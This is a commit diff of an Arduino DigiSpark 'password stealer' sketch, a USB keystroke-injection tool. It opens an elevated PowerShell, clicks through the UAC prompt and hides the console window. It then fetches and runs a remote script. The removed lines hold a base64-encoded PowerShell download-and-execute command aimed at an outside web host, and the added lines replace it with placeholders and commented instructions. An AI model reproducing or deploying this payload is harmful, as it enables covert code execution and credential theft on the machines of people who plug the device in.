a8a1120b370073b3778151895f671360429c780f
srihari-humbarwadi <sriharihumbarwadi97@gmail.com>
2017-01-01 21:44:54 +0530

    Update password_stealer_final_.ino

--- password_stealer_final_.ino
+++ password_stealer_final_.ino
@@ -1,32 +1,32 @@
 #include "DigiKeyboard.h"
 void setup() {
- pinMode(1, OUTPUT); 
- digitalWrite(1, HIGH); 
- DigiKeyboard.delay(5000);
- DigiKeyboard.sendKeyStroke(0); 
- DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); 
+ pinMode(1, OUTPUT);              //Some chips have pin 0 for LED
+ digitalWrite(1, HIGH);           //Switch on led
+ DigiKeyboard.delay(5000);        //Delay at the start is always good
+ DigiKeyboard.sendKeyStroke(0);   //Send Blank keystroke
+ DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  //Opens run dialog
+ DigiKeyboard.delay(1000);   
+ DigiKeyboard.println("powershell Start-Process powershell.exe -verb runAs");  //Starts powershell in admin mode
  DigiKeyboard.delay(1000);
- DigiKeyboard.println("powershell Start-Process powershell.exe -verb runAs");
- DigiKeyboard.delay(1000);
- DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_RIGHT);
+ DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_RIGHT);   //Bypassing UAC
  DigiKeyboard.delay(500);
- DigiKeyboard.println("mode con cols=18 lines=1");
- DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_RIGHT);
- DigiKeyboard.sendKeyStroke(KEY_M);
+ DigiKeyboard.println("mode con cols=18 lines=1");  // Makes the window 1x18 for obfuscation
+ DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_RIGHT);  //Opens options for window
+ DigiKeyboard.sendKeyStroke(KEY_M); //Selects move option
  for(int i=0;i<100;i++)
- DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);  
+ DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);   //drags window towards the bottom
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
- DigiKeyboard.println(F("powershell -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AbwBsAGcAdQB5AGkAcwBiAGEAYwBrAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA7AGUAeABpAHQAOwA=;exit"));
- //DigiKeyboard.println(F("IEX (New-Object Net.WebClient).DownloadString('https://coolguyisback.000webhostapp.com/s.ps1');exit;")); ->without encoding <-
- while(1){
+ DigiKeyboard.println(F("powershell -encodedCommand <PUT_YOUR BASE64 ENCODED COMMAND HERE>;exit"));  //input your BASE64 encoded downloadstring command here.
+ //DigiKeyboard.println(F("IEX (New-Object Net.WebClient).DownloadString('LINK_TO_MY_FILE/s.ps1');exit;")); ->without encoding <- uncomment this to used without encoding
+ while(1){ 
    digitalWrite(1, HIGH);
-   DigiKeyboard.delay(100);
+   DigiKeyboard.delay(100);  // this block makes the led blink,to show you can safely remove the usb
    digitalWrite(1, LOW);
    DigiKeyboard.delay(100);
  }
 }
 
-void loop() {
+void loop() {  // no need for anycode in this block
 
 
 }
